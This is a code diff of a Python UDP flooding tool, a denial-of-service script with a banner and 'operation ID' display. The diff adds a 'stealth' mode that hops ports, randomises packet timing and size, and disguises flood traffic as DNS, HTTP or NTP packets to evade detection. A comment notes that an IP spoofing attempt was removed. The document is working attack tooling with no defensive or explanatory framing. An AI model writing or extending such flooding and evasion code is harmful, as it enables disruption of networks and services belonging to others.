@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import socket
 import random
 import time
@@ -8,12 +9,16 @@ import statistics
 from datetime import datetime
 
 class UDPFlooder:
-    def __init__(self, target_ip="192.168.1.255", port=9999, packet_size=1472, threads=1, duration=0):
+    def __init__(self, target_ip="192.168.1.255", port=9999, packet_size=1472, 
+                 threads=1, duration=0, stealth=False, min_delay=0.1, max_delay=2.0):
         self.target_ip = target_ip
-        self.port = port
-        self.packet_size = packet_size
+        self.port = port if not stealth else self.random_port()
+        self.packet_size = packet_size if not stealth else random.randint(64, 2048)
         self.threads = threads
         self.duration = duration
+        self.stealth = stealth
+        self.min_delay = min_delay
+        self.max_delay = max_delay
         self.running = False
         self.sent_packets = 0
         self.start_time = 0
@@ -21,6 +26,22 @@ class UDPFlooder:
         self.connection_quality = "EXCELLENT"
         self.last_warning_time = 0
         self.operation_id = f"OP-{random.randint(10000, 99999)}"
+        self.port_hopping_interval = 5  # seconds for port hopping
+        self.last_port_change = time.time()
+        
+    def random_port(self):
+        return random.randint(1024, 65535)
+    
+    def generate_stealth_payload(self):
+        # Mimic common protocols
+        protocols = {
+            'dns': b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
+            'http': b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n',
+            'ntp': b'\x1b' + random._urandom(47)
+        }
+        if random.random() > 0.7:  # 30% chance to use protocol mimic
+            return random.choice(list(protocols.values()))
+        return random._urandom(self.packet_size)
         
     def print_header(self):
         print("\033[34m")  # Blu
@@ -31,24 +52,43 @@ class UDPFlooder:
         print(" ███████║███████╗██║  ██║   ██║   ██║  ██║███████╗██║  ██║")
         print(" ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝")
         print("\033[0m")
-        print(f"\033[36mOPERATION ID: {self.operation_id} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
+        mode = "\033[32mSTEALTH\033[0m" if self.stealth else "\033[31mNORMAL\033[0m"
+        print(f"\033[36mOPERATION ID: {self.operation_id} | MODE: {mode} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m")
         print("\033[90m" + "-" * 80 + "\033[0m")
         
     def flood(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        data = random._urandom(self.packet_size)
-        
+    
         while self.running:
             try:
+            # Stealth features
+                if self.stealth:
+                    current_time = time.time()
+                # Port hopping
+                    if current_time - self.last_port_change > self.port_hopping_interval:
+                        self.port = self.random_port()
+                        self.last_port_change = current_time
+                
+                # Random delay
+                    delay = random.uniform(self.min_delay, self.max_delay)
+                    time.sleep(delay)
+                
+                # Random packet size and content
+                    data = self.generate_stealth_payload()
+                else:
+                    data = random._urandom(self.packet_size)
+            
+            # Removed the IP spoofing attempt as it causes problems on Windows
+            
                 start_packet = time.time()
                 sock.sendto(data, (self.target_ip, self.port))
                 end_packet = time.time()
-                
+            
                 send_time = (end_packet - start_packet) * 1000
                 if send_time > 10:
                     self.check_connection_quality()
-                
+            
                 self.sent_packets += 1
             except socket.error as e:
                 self.log_error(f"NETWORK ERROR: {str(e)}", severity="HIGH")
@@ -57,7 +97,7 @@ class UDPFlooder:
             except Exception as e:
                 self.log_error(f"SYSTEM ERROR: {str(e)}", severity="CRITICAL")
                 break
-                
+            
         sock.close()
     
     def log_error(self, message, severity="MEDIUM"):
@@ -176,6 +216,9 @@ def get_args():
     parser.add_argument("-s", "--size", type=int, help="Payload configuration", default=1472)
     parser.add_argument("-t", "--threads", type=int, help="Concurrency level", default=1)
     parser.add_argument("-d", "--duration", type=int, help="Operation duration", default=0)
+    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
+    parser.add_argument("--min-delay", type=float, default=0.1, help="Minimum delay between packets in stealth mode")
+    parser.add_argument("--max-delay", type=float, default=2.0, help="Maximum delay between packets in stealth mode")
     parser.add_argument("-h", "--help", action="help", help="Show this message")
     return parser.parse_args()
 
@@ -186,6 +229,9 @@ if __name__ == "__main__":
         port=args.port,
         packet_size=args.size,
         threads=args.threads,
-        duration=args.duration
+        duration=args.duration,
+        stealth=args.stealth,
+        min_delay=args.min_delay,
+        max_delay=args.max_delay
     )
     flooder.start()
